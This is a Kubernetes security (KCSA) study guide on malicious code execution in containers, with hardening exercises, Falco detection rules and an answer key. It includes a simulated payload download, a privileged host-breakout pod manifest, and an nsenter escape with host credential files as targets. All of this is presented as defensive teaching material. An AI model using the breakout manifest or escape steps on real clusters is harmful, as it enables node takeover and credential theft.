# KCSA Study Guide: Topic 4.4 — Malicious Code Execution and Compromised Applications in Containers

**Domain:** Container Security & Runtime Security  
**Exam Weight:** ~2.29%  
**Target Audience:** SREs, DevSecOps Engineers, and Cloud Native Security Architects  

---

## 1. Deep Technical Breakdown & Architecture

### 1.1 Mechanics of Container Compromise
In a containerized environment, containers share the host machine's Linux kernel. A compromised application (e.g., via Remote Code Execution [RCE], dependency poisoning, or web application vulnerabilities like command injection) allows an attacker to execute unauthorized code within the execution context of the container process. 

The blast radius of malicious code execution is governed by four primary boundaries:
1. **User Identity & Privilege Level (`UID 0` vs. Unprivileged Users):** Running as `root` (`UID 0`) inside a container grants full access to container resources and significantly increases the attack surface against the kernel. If kernel user namespaces (`userns`) are not active, container `root` maps directly to host `root` (`UID 0`).
2. **Linux Capabilities:** Capabilities break down `root` privileges into granular units (e.g., `CAP_NET_RAW`, `CAP_SYS_ADMIN`, `CAP_CHOWN`). Retaining default Linux capabilities allows an attacker to manipulate networking, perform raw packet inspection, mount filesystems, or load kernel modules if container isolation is weak.
3. **Filesystem Immutability:** A writable root filesystem permits attackers to download malicious payloads (e.g., cryptominers, C2 implants), modify system binaries in `/bin` or `/usr/bin`, alter shared libraries (`/lib64`), or install persistence scripts.
4. **Kernel System Call Surface:** Containers interact with the kernel via system calls (`syscalls`). Unrestricted syscall access permits malicious processes to interact with host kernel subsystem vulnerabilities (e.g., `unshare`, `ptrace`, `bpf`).

```
+-----------------------------------------------------------------------------------+
|                                  HOST KERNEL                                      |
|  +-----------------------------------------------------------------------------+  |
|  |                             Seccomp Filter                                  |  |
|  +-----------------------------------------------------------------------------+  |
|          ^                                             ^                          |
|          | Blocked Syscalls                            | Allowed Syscalls         |
+----------|---------------------------------------------|--------------------------+
           |                                             |
+----------|---------------------------------------------|--------------------------+
|  CONTAINER NAMESPACE                                   |                          |
|  +-----------------------------+             +-----------------------------+  |
|  |   COMPROMISED CONTAINER     |             |     HARDENED CONTAINER      |  |
|  |  - UID: 0 (root)            |             |  - UID: 10001 (non-root)    |  |
|  |  - Writable Filesystem      |             |  - Read-Only Root FS        |  |
|  |  - Capabilities: Default    |             |  - Capabilities: Drop ALL   |  |
|  |  - Syscall Surface: Full    |             |  - Seccomp: RuntimeDefault  |  |
|  |  [ Malicious Payload Exec ] |             |  [ Execution Blocked ]      |  |
|  +-----------------------------+             +-----------------------------+  |
+-----------------------------------------------------------------------------------+
```

### 1.2 Defense-in-Depth Architectural Trade-offs

| Security Control | Technical Mechanism | Production Advantage | Operational Trade-off |
| :--- | :--- | :--- | :--- |
| **Non-Root Execution** (`runAsNonRoot`) | Enforces `setuid`/`setgid` to non-zero IDs before entrypoint execution. | Prevents containerized processes from performing host-level root operations upon breakout. | Requires container images built with non-root default users or explicitly defined UID/GID mappings. |
| **Read-Only Root Filesystem** (`readOnlyRootFilesystem`) | Mounts root (`/`) as read-only via `pivot_root`/`chroot` flags. | Prevents dropped binaries, cryptominers, and persistent file modifications. | Demands explicit `emptyDir` mounts for application directories requiring temporary write access (e.g., `/tmp`, log directories). |
| **Drop Capabilities** (`capabilities: drop: ["ALL"]`) | Clears the process capability bounding set (`PR_CAPBSET_DROP`). | Minimizes kernel exploitation primitives (e.g., raw sockets, chown, process tracing). | Applications requiring specific low-level privileges (e.g., binding to port 80 via `CAP_NET_BIND_SERVICE`) require fine-grained capability additions. |
| **Seccomp Profiling** (`seccompProfile`) | Loads `bpf` state-machine filters via `prctl(PR_SET_SECCOMP)` to restrict syscalls. | Prevents execution of dangerous or unused kernel system calls (`ptrace`, `kexec_load`). | Misconfigured profiles may block legitimate application syscalls, leading to runtime failures. |
| **Runtime Auditing Engine** (e.g., Falco) | Captures kernel events via eBPF probes or kernel module tracepoints at `sys_enter`/`sys_exit`. | Detects anomalous process spawner trees (e.g., `nginx` spawning `sh`), file modifications, and unexpected outbound connections in real time. | Generates telemetry overhead and requires tuning rules to prevent alert fatigue. |

### 1.3 Official References & Standards
- [CNCF KCSA Curriculum v1.0](https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf)
- [Kubernetes Documentation: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Kubernetes Documentation: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Falco Documentation: Container Threat Detection & Rules Engine](https://falco.org/docs/rules/)
- [NIST SP 800-190: Application Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)

---

## 2. Guided Production Hands-on Exercises

### Exercise 1: Hardening Workloads Against Arbitrary Code Execution and In-Container Escalation

#### Step 1: Deploy a Vulnerable/Unconfined Pod Manifest
Create a manifest named `vulnerable-pod.yaml` representing a vulnerable application deployed with default, unconfined security contexts (running as root with a writable root filesystem).

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-app-pod
  namespace: default
  labels:
    tier: frontend
    security-state: unconfined
spec:
  containers:
  - name: vulnerable-container
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "sleep 3600"]
```

Apply the deployment manifest:

```bash
kubectl apply -f vulnerable-pod.yaml
```

Expected output:
```text
pod/vulnerable-app-pod created
```

#### Step 2: Simulate Malicious Code Execution & Remote Payload Ingress
Simulate an attacker gaining arbitrary command execution inside the container via RCE, installing unauthorized packages (`curl`), dropping an unapproved binary into `/tmp`, and modifying system binaries.

```bash
kubectl exec -it vulnerable-app-pod -- bash -c "apt-get update && apt-get install -y curl && curl -o /tmp/malicious_miner https://httpbin.org/bytes/1024 && chmod +x /tmp/malicious_miner && echo 'hacked' > /usr/bin/compromised_binary"
```

Expected output:
```text
Get:1 http://archive.ubuntu.com/ubuntu jammy InRelease [270 kB]
...
Setting up curl (7.81.0-1ubuntu1.16) ...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1024  100  1024    0     0   3120      0 --:--:-- --:--:-- --:--:--  3122
```

Verify that the unauthorized payload exists and execution permissions were granted:

```bash
kubectl exec -it vulnerable-app-pod -- ls -l /tmp/malicious_miner /usr/bin/compromised_binary
```

Expected output:
```text
-rwxr-xr-x 1 root root 1024 Aug  7 20:15 /tmp/malicious_miner
-rw-r--r-- 1 root root    7 Aug  7 20:15 /usr/bin/compromised_binary
```

#### Step 3: Inspect Process Capabilities and UID Context
Examine the active Linux capabilities assigned to the container process. Notice that default capabilities (`CAP_NET_RAW`, `CAP_SYS_CHROOT`, `CAP_MKNOD`, etc.) are retained.

```bash
kubectl exec -it vulnerable-app-pod -- grep Cap /proc/1/status
```

Expected output:
```text
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
```

Decode the Effective Capabilities bitmask (`00000000a80425fb`) using `capsh` (or `capsh --decode` if available on the host):

```bash
capsh --decode=00000000a80425fb
```

Expected output:
```text
00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

#### Step 4: Construct and Apply a Production-Grade Hardened Pod Manifest
Create a new file named `hardened-pod.yaml`. This manifest enforces:
- Non-root user execution (`runAsNonRoot: true`, `runAsUser: 10001`)
- Complete dropping of all Linux capabilities (`drop: ["ALL"]`)
- Disabling privilege escalation (`allowPrivilegeEscalation: false`)
- Immutability of the root filesystem (`readOnlyRootFilesystem: true`)
- Standard Seccomp profile application (`type: RuntimeDefault`)
- Explicit `emptyDir` mount for designated temporary directory writes.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-app-pod
  namespace: default
  labels:
    tier: frontend
    security-state: hardened
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: hardened-container
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    volumeMounts:
    - mountPath: /tmp
      name: tmp-volume
  volumes:
  - name: tmp-volume
    emptyDir:
      medium: Memory
      sizeLimit: 64Mi
```

Apply the hardened manifest:

```bash
kubectl apply -f hardened-pod.yaml
```

Expected output:
```text
pod/hardened-app-pod created
```

#### Step 5: Verify Mitigation of Malicious Execution Vectors
Attempt to execute package managers or write to protected system directories (`/usr/bin`) inside the hardened pod.

```bash
kubectl exec -it hardened-app-pod -- touch /usr/bin/malicious_payload
```

Expected output:
```text
touch: cannot touch '/usr/bin/malicious_payload': Read-only file system
command terminated with exit code 1
```

Attempt to modify package sources or system binaries:

```bash
kubectl exec -it hardened-app-pod -- apt-get update
```

Expected output:
```text
Reading package lists... Done
E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)
E: Could not open lock file /var/lib/apt/lists/lock - open (30: Read-only file system)
E: Unable to lock the administration directory (/var/lib/apt/lists/), are you root?
command terminated with exit code 100
```

Verify that process capabilities are completely cleared (`0000000000000000`):

```bash
kubectl exec -it hardened-app-pod -- grep Cap /proc/1/status
```

Expected output:
```text
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000000000000000
CapAmb:	0000000000000000
```

---

#### Verification Questions — Exercise 1
1. **Question 1.1:** Why does setting `readOnlyRootFilesystem: true` prevent an attacker from persisting a dropped binary payload, and how does the application handle legitimate write operations (e.g., cache or temporary files) without breaking?
2. **Question 1.2:** If a container running as `UID 10001` with `capabilities.drop: ["ALL"]` exploits a vulnerability in an application binary that has the SUID bit set (`-rwsr-xr-x`), will the process successfully escalate privileges to `root`? Explain the mechanism.

---

### Exercise 2: Runtime Threat Detection of Malicious Execution via Syscall Auditing (Falco)

#### Step 1: Define a Custom Falco Security Rule
In this step, construct a custom rule for the CNCF Falco runtime security engine to detect unexpected shell invocations and package manager execution inside production containers.

Create a local rule definition file named `falco_custom_rules.yaml`:

```yaml
- rule: Terminal Shell Spawned in Container
  desc: Detects an interactive terminal shell executed inside a running container context
  condition: >
    spawned_process and 
    container and 
    proc.name in (bash, sh, zsh, ksh, csh) and 
    not user_expected_terminal_shells
  output: >
    ALERT Malicious Terminal Executed (user=%user.name user_id=%user.uid 
    container_id=%container.id container_name=%container.name 
    image=%container.image.repository process=%proc.name cmdline=%proc.cmdline 
    parent=%proc.pname)
  priority: WARNING
  tags: [container, runtime, execution, mitre_execution]

- rule: Package Management Executed in Container
  desc: Detects execution of package managers inside a running container at runtime
  condition: >
    spawned_process and 
    container and 
    proc.name in (apt, apt-get, dpkg, yum, dnf, apk)
  output: >
    CRITICAL Package Manager Triggered in Container (user=%user.name 
    container_name=%container.name image=%container.image.repository 
    cmdline=%proc.cmdline)
  priority: CRITICAL
  tags: [container, runtime, persistence]
```

#### Step 2: Simulate Runtime Falco Event Generation
Simulate a Falco event by spawning a shell and running `apk` or `apt-get` inside a pod named `monitored-app-pod`.

Deploy a target pod:

```bash
kubectl run monitored-app-pod --image=nginx:alpine --restart=Never
```

Expected output:
```text
pod/monitored-app-pod created
```

Execute an interactive command that triggers both rule conditions (`spawned_process` of shell and `apk` package manager execution):

```bash
kubectl exec -it monitored-app-pod -- sh -c "apk add --no-cache curl"
```

Expected output:
```text
fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz
(1/5) Installing ca-certificates (20230506-r0)
...
OK: 11 MiB in 22 packages
```

#### Step 3: Inspect Falco Sensor Telemetry Logs
Query the Falco daemonset logs (or local systemd service logs if running directly on the host node) to confirm detection of system calls (`execve`) associated with the malicious pattern.

```bash
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=100 | grep -E "CRITICAL|WARNING"
```

Expected output:
```json
{"severity":"Warning","time":"2026-08-07T20:22:04.182948123Z","rule":"Terminal Shell Spawned in Container","output":"20:22:04.182948123: WARNING ALERT Malicious Terminal Executed (user=root user_id=0 container_id=a3f89d12c4b1 container_name=monitored-app-pod image=nginx process=sh cmdline=sh -c apk add --no-cache curl parent=containerd)","output_fields":{"container.id":"a3f89d12c4b1","container.image.repository":"nginx","container.name":"monitored-app-pod","proc.cmdline":"sh -c apk add --no-cache curl","proc.name":"sh","proc.pname":"containerd","user.name":"root","user.uid":0}}
{"severity":"Critical","time":"2026-08-07T20:22:04.210481902Z","rule":"Package Management Executed in Container","output":"20:22:04.210481902: CRITICAL Package Manager Triggered in Container (user=root container_name=monitored-app-pod image=nginx cmdline=apk add --no-cache curl)","output_fields":{"container.image.repository":"nginx","container.name":"monitored-app-pod","proc.cmdline":"apk add --no-cache curl","proc.name":"apk","user.name":"root"}}
```

---

#### Verification Questions — Exercise 2
1. **Question 2.1:** What low-level Linux kernel interface does Falco leverage to intercept system call invocations (e.g., `execve`, `connect`, `openat`) without modifying container images or application source code?
2. **Question 2.2:** If an attacker executes a statically compiled binary via standard input redirection (`cat miner.hex | xxd -r | perl`) without calling an interactive shell binary like `/bin/sh`, which Falco condition will still capture the execution event?

---

### Exercise 3: Preventing Container Breakouts and Host Namespace Leaks with Pod Security Admission

#### Step 1: Analyze a Malicious Host Breakout Manifest
Review a dangerous manifest (`host-breakout-pod.yaml`) designed to compromise the underlying Kubernetes worker node by sharing the host PID namespace, mounting the host root filesystem (`/`), and requesting `CAP_SYS_ADMIN`.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-breakout-pod
  namespace: target-workloads
spec:
  hostPID: true
  containers:
  - name: escape-container
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

#### Step 2: Configure Namespace Enforcement via Pod Security Admission (PSA)
Label the target namespace `target-workloads` with the Built-in Pod Security Standard `restricted` profile in `enforce` mode.

Create namespace manifest `namespace-security.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: target-workloads
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
```

Apply the namespace definition:

```bash
kubectl apply -f namespace-security.yaml
```

Expected output:
```text
namespace/target-workloads created
```

#### Step 3: Test Admission Control Rejection of Non-Compliant Workloads
Attempt to deploy the `host-breakout-pod.yaml` manifest into the secured `target-workloads` namespace.

```bash
kubectl apply -f host-breakout-pod.yaml -n target-workloads
```

Expected output:
```text
Error from server (Forbidden): error when creating "host-breakout-pod.yaml": pods "malicious-breakout-pod" is forbidden: violates PodSecurity "restricted:latest": host namespaces (hostPID=true), privileged (container "escape-container" must not set securityContext.privileged=true), allowPrivilegeEscalation != false (container "escape-container" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "escape-container" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "escape-container" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "escape-container" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

#### Step 4: Validate Admission Audit Logs
Inspect the API server audit logs to verify that the policy violation event was logged for security monitoring.

```bash
grep "malicious-breakout-pod" /var/log/kubernetes/kube-apiserver-audit.log | grep "annotations"
```

Expected output snippet:
```json
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Request","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/target-workloads/pods","verb":"create","user":{"username":"kubernetes-admin","groups":["system:masters"]},"responseStatus":{"metadata":{},"status":"Failure","message":"pods \"malicious-breakout-pod\" is forbidden...","reason":"Forbidden","code":403},"annotations":{"pod-security.kubernetes.io/enforce-policy":"restricted:latest","pod-security.kubernetes.io/audit-decision":"deny"}}
```

---

#### Verification Questions — Exercise 3
1. **Question 3.1:** What specific threat vector does setting `hostPID: true` introduce, and how can an attacker leverage it alongside a mounted host path or high capabilities to escape to the host node?
2. **Question 3.2:** How does Kubernetes Pod Security Admission (PSA) differ from third-party admission controllers like Kyverno or OPA/Gatekeeper in terms of implementation architecture and execution lifecycle?

---

## 3. Answer Key & Comprehensive Explanations

<details>
<summary>Click to view Answers and Technical Explanations</summary>

### Exercise 1 Answers

**1.1 Read-Only Root Filesystem Mechanics & Operational Handling:**
* **Technical Mechanism:** When `readOnlyRootFilesystem: true` is configured, the container runtime mounts the root layer (`/`) using the read-only flag (`MS_RDONLY`) during `pivot_root` or `chroot`. If an attacker executes arbitrary code (e.g., via RCE), any syscall that attempts to write to disk (such as `open()` with `O_CREAT` or `O_WRONLY`, `write()`, `link()`, or `unlink()`) returns error code `EROFS` (`Read-only file system`). Dropped payloads cannot be saved, and configuration/binary alteration is blocked.
* **Handling Legitimate Writes:** Applications that require write access for state, temporary files, or sockets must explicitly declare ephemeral volumes (`emptyDir` or persistent volume mounts) targeting specific directories (e.g., `/tmp`, `/var/run`, `/var/cache`). In `hardened-pod.yaml`, an `emptyDir` backed by memory (`medium: Memory`) is mounted at `/tmp`, confining write operations to an ephemeral, size-bounded buffer while keeping the rest of the filesystem immutable.

**1.2 Privilege Escalation & `allowPrivilegeEscalation: false`:**
* **Technical Mechanism:** Setting `allowPrivilegeEscalation: false` directly sets the `no_new_privs` bit in the Linux kernel for the container process via `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)`.
* **Execution Result:** Even if an attacker finds an executable binary inside the container with the SUID bit set (`-rwsr-xr-x`), the kernel disables privilege transition during the `execve()` system call. The process will **not** acquire `UID 0` privileges or capabilities. Additionally, because `capabilities.drop: ["ALL"]` clears the capability bounding set, the process cannot elevate its Effective Capability set regardless of binary flags.

---

### Exercise 2 Answers

**2.1 Kernel Tracing Subsystem used by Falco:**
* **Technical Mechanism:** Falco captures kernel events at runtime using **eBPF (Extended Berkeley Packet Filter)** programs attached to kernel tracepoints (`sys_enter` and `sys_exit`), or via a legacy ring-buffer kernel module (`falco.ko`).
* **Why it matters:** Because syscall auditing occurs inside the host kernel space, event capture is out-of-band and transparent to the containerized environment. An attacker inside a compromised container cannot manipulate, disable, or deceive the sensor by modifying container userspace libraries or binaries (`libc`, `bash`).

**2.2 Syscall Capture Beyond Shell Spawning:**
* **Rule Engine Behavior:** Even if an attacker avoids invoking shell processes like `/bin/sh` or `/bin/bash`, any executable file running in the system must invoke the `execve` or `execveat` system calls to spawn a process.
* **Detection:** Falco monitors all `execve` system calls in real-time across all container processes. If an attacker runs a binary or invokes a package manager (`apk`, `apt`), the `spawned_process` macro fires on the `execve` system call, extracting process name (`proc.name`), command line (`proc.cmdline`), and process ancestry (`proc.pname`), triggering alerts regardless of how the execution was wrapped.

---

### Exercise 3 Answers

**3.1 Threats of `hostPID: true` and Breakout Vectors:**
* **Threat Vector:** Setting `hostPID: true` breaks container process namespace isolation. The containerized process shares the process table of the host operating system. The container can view all processes running on the host node (including `kubelet`, `containerd`, and system daemons) and inspect host environment variables via `/proc/<host-pid>/environ`.
* **Breakout Mechanism:** If combined with `CAP_SYS_ADMIN` or a root user context, an attacker can use `nsenter` (e.g., `nsenter -t 1 -m -u -n -i bash`) to attach to PID 1 (`systemd` on host), switching namespaces to achieve full host node takeover. If the host filesystem `/` is mounted, the attacker can alter `/etc/shadow`, write SSH keys to `/root/.ssh/authorized_keys`, or manipulate `kubelet` credentials stored in `/var/lib/kubelet/pki/`.

**3.2 Pod Security Admission (PSA) vs. Third-Party Admission Controllers:**
* **Architecture:** PSA is built directly into the Kubernetes API server (`kube-apiserver`) as an admission plugin. It evaluates Pod creation/update requests against predefined, static profiles (`privileged`, `baseline`, `restricted`) defined by the official Pod Security Standards.
* **Performance & Extensibility:** Because PSA runs in-process within `kube-apiserver`, it introduces negligible latency and requires no out-of-cluster webhooks or external CRDs. However, PSA cannot enforce custom logic or mutate manifests. Third-party controllers (Kyverno, OPA/Gatekeeper) run as external Dynamic Admission Webhooks (`ValidatingWebhookConfiguration` / `MutatingWebhookConfiguration`). They allow customized policy definition (Rego or YAML-based declarative rules), policy testing frameworks, and resource mutation, but introduce network dependencies and processing overhead to API server request handling.

</details>

---

## 4. Summary Checklist for the KCSA Exam

- [ ] Recognize that container security context defaults leave workloads unconfined (running as root, full capability bounding sets, writable root filesystems).
- [ ] Understand the role of `runAsNonRoot: true`, `runAsUser: <non-zero>`, `allowPrivilegeEscalation: false`, and `readOnlyRootFilesystem: true` in mitigating malicious code execution.
- [ ] Memorize how `seccompProfile: { type: RuntimeDefault }` restricts the kernel syscall attack surface.
- [ ] Understand runtime detection mechanisms using Falco rules (intercepting `execve` via eBPF tracepoints).
- [ ] Know how to enforce Pod Security Standards (`restricted`) at the namespace level using Pod Security Admission labels (`pod-security.kubernetes.io/enforce: restricted`).